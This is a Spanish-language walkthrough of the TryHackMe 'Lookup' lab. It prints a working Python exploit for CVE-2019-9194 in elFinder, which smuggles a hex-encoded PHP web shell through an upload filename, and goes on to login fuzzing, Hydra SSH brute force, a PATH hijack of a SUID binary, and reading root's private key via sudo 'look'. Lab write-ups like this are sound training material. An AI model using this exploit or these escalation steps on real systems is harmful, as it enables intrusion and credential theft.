# LOOKUP ROOM TryHackMe
### *By tunlp*

![LOOKUP](/screenshots/000_ROOM_NAME.png)


---
## INTRODUCCIÓN
Este *'Room'* es una máquina vulnerable proporcionada por la plataforma TryHackMe para practicar en el ámbito del hacking ético y pentesting. Como *'pista'* nos comenta que debemos practicar nuestras habilidades de enumeración en una *'boot-to-root machine'*, por lo tanto probablemente también nos permita escalar privilegios a Root.
---
## Desarrollo
Para empezar debo arrancar la máquina víctima además de conectar via OpenVPN a la plataforma.
Tenemos como dato el concepto de 'enumeración' y una IP (10.130.173.23). Para poder descubrir servicios expuestos y conexiones TCP que realiza, utilicé `nmap` para realizar un scan.
```sh
nmap -sS -sV 10.128.155.108
```
- `-sS` : Envía paquetes TCP con cabecera 'SYN' que inicia una conexión.
- `-sV` : Probar puertos abiertos y resolver el servicio.

![Nmap Output](/screenshots/00_nmap-result.png)
EL reconocimiento enseña  2 servicios activos con puertos abiertos: `ssh` y `http` en los puertos **22** y **80** respectivamente. Accedo a  la página web http proporcionada por el puerto 80:

![Pagina Unavailable](/screenshots/01_Unavailable_Web.png)

La pagina devuelve `Server Not Found`, pero  en el campo del URL nos encontramos con `lookup.thm`, para poder resolver el nombre de dominio, agrego el IP y el Nombre a `/etc/hosts` con el comando `sudo vim /etc/hosts`
![Edit /etc/hosts](/screenshots/03_Web_Resolved.png)

Para poder recopilar más datos sobre posibles subdominios/directorios , realicé un fuzzing con `ffuf`:

```sh
sudo ffuf -w /home/user/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://lookup.thm/FUZZ -e .php > fuzz_domain_results.txt 
```
- `-u` : URL
- `-e .php`: Extensiones php

como resultado, se pudo conocer: `index.php` y `login.php`.
![Fuzz_Result](/screenshots/04_Web_Enumeration.png)

A seguir, intenté un 'fuzz' para intentar enumerar usuarios válidos en función a una contraseña básica aleatoria, después de un par de intentos, utilicé la contraseña `password123` en `http://lookup.thm/login.php`.

```sh
sudo ffuf -w /home/neurone/Documents/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://lookup.thm/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=password123" -ac
```
![Fuzz php Parameter Results](/screenshots/05_fuzz_parameter_results.png)

Como resultado encuento el usuario `jose` con `HTTP:302`, con esta información puedo probar el login con las credenciales `username:jose & password:password123`

![Login Attempt](/screenshots/06_Login_Successful.png) 

El login es éxitoso y me redirecciona a `http://files.lookup.thm` , con `Server not Found` por lo tanto agrego este nombre de domínio junto a `lookup.thm` en `/etc/hosts/`

![Dashboard Panel](/screenshots/07_Panel_Dashboard.png)

Después de actualizar `/etc/hosts/` veo que ya puedo visualizar el 'Panel' del website que contiene `Web-Files` que pueden ser de importancia para el proceso, como : `admin`,`mysql`;algunos contienen un candado en el ícono, menos `credentials.txt` , que puede dar más pistas.

![Credentials.txt](/screenshots/08_Credentials_Read.png)

Al abrir `credentials.txt` encuentro el siguiente texto: `think : nopassword`.
Por otro lado, intento también leer los archivos que contienen candado y me permite visualizar cierta información  que no indican un pista concreta, solamente valores que talvez podamos considerar. Enfoqué la búsqueda en los documentos: `admin.txt`,`root.txt`, `mysql.txt`y `administrator.txt` con sus respectivas salidas:

- admin.txt:
```
pectic
agretha
only-begotten
renewable
```
- root.txt
```
symmetrical
volumetrically
```

- mysql.txt
```
acculturation
rotterdam
idiosyncratically
```
- administrator.txt
```
rycca
show-offs
overcast
packinghouse
```
Convencido de que esta información NO es relevante, sigo a investigar  más sobre el software de la página.

![Dashboard Software](/screenshots/09_Dashboard_Software.png)

El software por detrás del dashboard de la aplicación web (`elFinder 2.1.47`), realicé una búsqueda en el navegador '`elFinder CVE`', encontrando una CVE (`CVE-2019-9194`) que al parecer permite inyección de comandos en aplicaciones web.

![Available Vulnerability](/screenshots/10_CVE_Found.png)

Investigando la funcionalidad del exploit, realizo ajustes en algunas variables ya que la primera ejecución resultó en error por un parámetro  olbsoleto  en las nuevas versiones de Python.

```py
# CVE: CVE-2019-9194
import requests
import json
import sys
payload = 'IMAGE.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > IMAGE.php;echo IMAGE.jpg'
def usage():

    if len(sys.argv) != 2:

        print ("Usage: python exploit.py [IP_OR_URL]")

        sys.exit(0)

def upload(url, payload):

    files = {'upload[]': (payload, open('IMAGE.jpg', 'rb'))}

    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}

    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)

    j = json.loads(r.text)

    return j['added'][0]['hash']

def imgRotate(url, hash):

    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))

    return r.text

def shell(url):

    r = requests.get("%s/php/IMAGE.php" % url)

    if r.status_code == 200:

       print ("[+]-- Owned  --")

       print ("[+] ENTERING SHELL . . .")

       while 1:

           try:

               cmd = input("$ ")

               r = requests.get("%s/php/IMAGE.php?c=%s" % (url, cmd))

               print (f"{r.text}")

           except KeyboardInterrupt:

               sys.exit("\n-- FINISHED --")

    else:

        print ("[*] NOT VULNERABLE")

def main():

    usage()

    url = sys.argv[1]

    print ("[*] UPLOADING PAYLOAD . . .")

    hash = upload(url, payload)

    print ("[*] RUNNING PAYLOAD . . .")

    imgRotate(url, hash)

    shell(url)

if __name__ == "__main__":

    main()
```
El exploit utiliza una imagen de payload, como el codigo altera valores del binario de la imagen, podemos utilizar cualquiera ya que el servidor necesita identificarlo como una.

Ejecuto el exploit direccionado a `http://files.lookup.thm/elFinder/`. Como resultado, puedo  apreciar el exploit existoso, estando dentro de la `shell` del servidor, compruebo con `ifconfig` que la IP coincide con la del servidor.
![Exploit Completed](/screenshots/11_Exploit_Completed.png)
![Server IP Confirmation](/screenshots/12_IP_THM_Check.png)

Una vez dentro del servidor `$ shell`, pruebo enumerar y leer  archivos que puedan ser importantes, empezamos por ssh:

![SSH Enumeration](/screenshots/13_SSH_Enumeration.png)
![SSH Host Key](/screenshots/14_SSH_Host_key.png)

Por otro lado, intento enumerar `/etc/passwd`, lo que me sale 'válido' y por lo tanto un `cat /etc/passwd` identificando usuarios y sus respectivos ID's.

![Cat Passwords](/screenshots/15_CAT_Passwd.png)

Ya que puedo leer `/etc/passwd` , seguramente puedo enumerar los usuarios y ver su contenido:

![Users Enumeration](/screenshots/16_User_Enum.png)

Encuentro  3 posibles usuarios al servidor: `ssm-user`,`think` y `ubuntu`. Siendo `think` conocido (en /elFinder/credentials.txt - 'think : nopassword') y `ubuntu` el 'mejor candidato' a ser usuario root por el Default de un UbuntuServer. Una vez conocidos posibles usuarios ssh, intenté realizar un bruteforce de contraseña con `Hydra`:

```sh
hydra -l think/ubuntu/root -P /wordlist.txt ssh://<IP_MACHINE>
```
Después de intentar con una wordlist pequeña y mediana, me di cuenta que 'think : nopassword' era una señal para no intentar por el camino del bruteforce de contraseña. 

Considerando que estaba conectado `$Shell`, podía navegar y enumerar directorios, leer y ejecutar ciertos comandos y archivos, necesito conocer los permisos que tengo. Pero no los míos en el sistema, sino " Qué archivos en el sistema que puedo tener permisos pero no son de mi actual usuario `www-data`?".
Para ello, busco con  `la -l` archivos que contienen la `SUID` de root.(Algo como `-rwsr-xr-x ... root root ...`).Así puedo encontrar ficheros que son de permiso `root` que yo pueda ejecutar con menos privilégios.

Realizo una búsuqeda específica de archivos en el sistema con `find /usr -type f -perm -4000 -ls`
- /usr: ruta de archivos de usuarios.
- find: Búsqueda que cumple con parametros.
- -type f: Limita la búsqueda a archivos 'files' (Excluye nombre de directório)
- -perm -4000: Busca archivos que tenga activado el bit SUID en la cuarta (4) posición en el formato octal de permisos (-rw`[s]`r-xr--)  

![Find Permissions](/screenshots/17_Permises_Search.png)

Me fijo en los directorios raiz de la salida , veo `/usr/bin` , `/usr/sbin` y `/usr/lib`. El primer `/usr/bin` no me interesa mucho, cuando anteriormente leí `/usr/bin/passwd`,no era información extremadamente útil y `/usr/bin` en linux,es la ruta de archivos compartidos entre los usuarios, en el que yo ya tengo cierto permiso. El tercer `/usr/lib` podría ser última opción de las 3. El segundo `/usr/sbin` es el que realmente interesa, ya que és la ruta de archivos para el administrador del sistema con permisos'`root`' y el 'match' exacto de la posición del bit `SUID`

![Sbin Directory Find](/screenshots/18_SBIN_Permission.png)

Con un `cat /usr/sbin/pwm` o bien `strings /usr/sbin/pwm` observo el siguiente fragmento:

![SBIN Interaction](/screenshots/19_SBIN_Interaction.png)

Identifico  que `/usr/sbin/pwm` interactúa con `/.passwords`, ya que se trata de un ejecutable, intento ejecutarlo, resultando en error por no encontrar `/.passwords` en el usuario con `ID: www-data`.

![/.passwords not found ](/screenshots/20_NOT_FOUND_PWD.png)

Curiosamente, me indica un ID no numérico y que utiliza el comando '`id`', para extraer el *username and user ID (UID)* así que hago lo mismo en la terminal.

![NUMERIC_ID](/screenshots/20_1_Numeric_ID.png)

'33', el número `id` de mi usuario. Tengo en cuenta estos datos y sigo investigando `/usr/sbin/pwm` con el comando `file` para conocer sobre el binario.

![FILE PWM](/screenshots/21_FILE_pwm.png)

Veo que tiene un parámetro `setgid`, otro, `setuid`. Además ,`ELF`, lo que indica que son funciones de  un 'binário ELF'. Por otro lado `dynamically linked` indica que hace llamadas dinámicas a funciones externas y `interpreter /lib64/ld-linux..` indica que puede leer y ejecutar código. Además, `not stripped`, conservando funciones.

Vuelvo a repetir `strings /usr/sbin/pwm` para ver como `pwm` procesa el valor del `id` y veo que lo hace con `uid=%u(%[^])` y también `GCC: (Ubuntu 9.4 ...)`.  

![id Process](/screenshots/22_How_Process_ID.png)

`GCC` es un compilador de lenguaje `C` así que lo más probable será que el código fuente esté  en C , `uid=%u(%[^])` => `uid` es la variable y `%u(%[^])` interactúa de alguna forma con el comando `id`.

Antes de entender la función, recordé sobre el link dinámico del binario y volví a los strings de  `/usr/sbin/pwm`.Para encontrar alguna pista sobre las librerías que importa, identifico el patrón `xxxxx@@GLIBC_2.2.5`. Pensé "seguramente son funciones de la libreria 'GLIBC' de la versión 2.2.5". Con `grep`.

![Binary Libs](/screenshots/24_BinaryLibs.png)

Me fijé que `fopen@@...`y `__libc_start_main@@...`, aparientan ser funciones. Me pregunté si podrían las funciones como `popen` o `fclose` ser exactamente las que están siendo utilizadas por el binario. Busqué sobre los comandos para analizar binarios y aprendi que `objdump` puede dar información muy detallada, primero miro las funciones definidas por el binario con la flag `-t`

![LDD Command](/screenshots/25_BinaryFunctions.png)

`*UND*` significa que el binario utiliza la función pero no la implementa localmente dentro de su proprio código.

Teniendo en cuenta que  `files` también me devolvió `not stripped` indicando que el binario ELF conserva nombres de funciones y variables,utilizo el comando `objdump -s /usr/sbin/pwm` , el `-s` nos permite representar el binario en su formato hexadecimal acompañado de su representación ASCII. De esa forma puedo ubicar la asignación en la memória de la ejecución de las funciones cuando busca el `id` hasta el aviso del `error`.

![Binary Execution Address](/screenshots/26_Binary_MemoryAddr.png)

La sección `.rodata` contiene el texto devuelto por el sistema al ejecutar el programa, en ella identifico las direcciones  `2070` y `2080` (`0x2070`,`0x2080`) .Utilizo `objdump -d /usr/sbin/pwm` , `-d` de 'dissasemble' para ver el contenido completo en ASSEMBLY y analizar en la sección `<main>` el orden de las funciones y cuándo son llamadas.

![Binary Disassemble](/screenshots/27_Identify_Function_Binary.png)

Analizando los datos, percibo que la lógica de estas funciones es la siguiente:
```
popen() -> fscanf() -> perror()
```
Concluyo que `popen()` ejecuta un comando , en este caso `id` y `fscanf()` lo interpreta recibiendo `wwww-data` y como no existe el archivo `.passwords` en este usuario, levanta el error con `perror()`.

Así que una posible solución sería manipular el comando que ejecuta `popen()` para que `fscanf()` interprete un usuario con más permisos que `www-data`. `/usr/sbin/pwm` devuelve el nombre del usuario y no el ID. verifico mi `$PATH` y busco la ruta que se encuentra el comando `id`.
![www-data PATH](/screenshots/28_id_PATH.png)

esta en `/usr/bin` pero no puedo escribir un archivo en esta ruta.Debo encontrar un directorio en el sistema que tenga permiso de escritura, dónde pueda escribir un archivo para crear la suplantación del comando `id` y agregarlo a `$PATH` para que `/usr/sbin/pwm` lo utilice.

Empiezo buscando con `ls -la` los directorios de la raiz, después de `/boot` , `/dev` tenía un directorio `/shm` con los permisos
necesarios`d-----xrw-`.

![/dev available](/screenshots/29_Write_Directory.png)

Realizo una prueba para comprobar que pueda escribir y ejecutar un script en este directorio. Copio el binario del comando `ls` de `/bin/ls` hacia `/dev/shm` y ejecuto.

![ls Command](/screenshots/30_dev-shm_test.png)

Pruebo escribir el archivo necesario, pero, aunque `ls` se haya podido copiar, lo que escribo no se guarda.
![Can't Write id](/screenshots/31_Basic_Sh_terminal.png)
Como estoy en un terminal `sh` básica, imagino que '#' y '!' estan generando algún conflicto; pruebo escribir el archivo nuevamente pero sustituyendo los simbolos por su representación octal `# = \43 y ! = \41`. 

![Test OK](/screenshots/32_Test_OK.png)

Perfecto, la escritura y ejecución funciona en este directorio, ahora tengo que crear el comando `id` falso. Sé que solo el usuario `think` tiene el fichero `/.passwords`, necesario para `/usr/sbin/pwm`. Anteriormente leí `/etc/passwd` y aqui pude encontrar el `UID` del usuario en cuestión.

![Think UID](/screenshots/33_Think_ID.png)

De esa manera puedo construir el formato de salida del comando `id`. Si la estructura siendo `www-data` es: 
```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Puedo replicar esta salida con la información del usuario `think` para que `/pwm` lo lea.

![Fake ID](/screenshots/34_Fake_ID_Ready.png)
![Fake ID Works](/screenshots/35_ID_COPY_THINK.png)

Listo! Mi comando `id` devuelve exactamente lo que le devuelve al usuario `think`. Ahora debo agregar `/dev/shm` a `$PATH` para quel `/pwm` elija mi comando antes del `id` de `/usr/bin`, exportamos el `$PATH` con `export PATH="/dev/shm/id:$PATH"`.

![Export PATH](/screenshots/36_Export_Path.png)

Ocurre el problema de que por la simplicidad de la terminal, si ejecuto en una única línea veo el `/dev/shm` agregado al `$PATH`; si ejecuto otra vez ya no me aparece la ruta de `id` en el `$PATH`.

Para solucionarlo, he recreado el archivo `id` con una secuencia de 'echos':
```sh
echo '\43\41/bin/\163\150' > /dev/shm/id

echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /dev/shm/id

chmod 755 /dev/shm/id

export PATH=/dev/shm:$PATH ; /usr/sbin/pwm
```
Como resultado, hago con que el binario me reconozca como usuario `think` y me devuelva el listado de contraseñas:
![Think Passwords List](/screenshots/37_PATH_Hijack.png)

Enseguida creao un fichero '.txt' como diccionario con las contraseñas encontradas y realizo un bruteforce ssh con Hydra para encontrar la contraseña real de `think`.

```sh
hydra -l think -P PATH/TO/USER/THINK/passwor_list.txt ssh://10.128.143.206 -t 4 -f -V
```
![Think Real Password](/screenshots/38_Think_real_PWD.png)
Realizo login ssh con el usuario `think` y la contraseña encontrada `josemario.AKA(think)`
![Login SSH User Think](/screenshots/39_We_Are_User_Think.png)
Me dirijo a `/home/think` para leer el primer flag `user.txt`.

![First Room Flag](/screenshots/40_First_Flag.png)

Enseguida utilizo el comando `sudo -l` para visualizar comandos que puedo ejecutar con `sudo` siendo usuario `think`.
![Allow Sudo Commands](/screenshots/41_Aloowed_Sudo_Commands.png)
Veo que puedo utilizar el comando `look` como `sudo`, visito : https://gtfobins.org , para conocer sobre este comando.
![GTFO BINS](/screenshots/42_GTFOBINS_INFO.png)

El comando `look` es para la visualización de archivos y con el formato que proporciona `gtfobins`, realizo la visualización de la clave privada ssh del usuario `root` ya que puedo ejecutarlo como administrador:
![Root Private KEY](/screenshots/43_Root_RSA_KEY.png)

Guardo la clave privada RSA de `root` en un archivo de texto. Enseguida realizo login ssh al usuario `root` utilizando su clave privada.
`ssh root@10.128.143.206 -i /PATH/TO/root.key `
![We Are ROOT](/screenshots/44_WE_ARE_ROOT.png)

Y con eso leer el Flag final de `root`

![Final Flag](/screenshots/45_ROOT_FLAG.png)

![Room Finished](/screenshots/47_Room_Finished.png)

Gracias.

![Pwned by tunlp](/screenshots/46_Pwned_by_tunlp.png)
